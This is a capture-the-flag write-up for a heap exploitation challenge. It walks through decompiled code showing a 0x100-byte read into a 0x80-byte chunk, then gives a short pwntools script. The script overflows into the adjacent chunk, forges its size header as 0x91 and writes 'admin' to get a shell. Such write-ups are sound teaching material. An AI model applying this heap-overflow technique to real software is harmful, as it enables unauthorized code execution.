# Heap 1

## Solution

In this challenge, it first allocates three objects in dynamic memory:
```
000014b4      int64_t rax = malloc(bytes: 0x80)
000014c5      char* rax_1 = malloc(bytes: 0x80)
000014d6      char* rax_2 = malloc(bytes: 0x80)
```
Then, the user is allowed to write to the first and third thing allocated:
```
000014f2      printf(format: "Enter your requested user >>> ")
00001509      read(fd: 0, buf: rax, nbytes: 0x100)
0000151d      printf(format: "Enter your requested role >>> ")
00001534      read(fd: 0, buf: rax_2, nbytes: 0x100)
```
Finally, we get a shell if the second piece of memory is equal to `admin`:
```
00001556      if (strncmp(rax_1, "admin", 5) == 0)
00001562          puts(str: "<<< Admin achieved. Freeing roleâ€¦")
0000156e          free(mem: rax_1)
00001578          rax_11 = admin()
```
Thus, the simple idea is to overflow the first one when the program reads to it and write `admin` to the second one using this. We note that, in order to accomplish this, we must fill in the top of the second chunk with a `0x91` to keep the heap in a valid state. Thus, in order to get a shell, we use the following code:
```python
p = start()

chain = cyclic(0x88)
chain += p64(0x91)
chain += b'admin'
p.sendline(chain)
p.sendline(b'a')

p.interactive()
```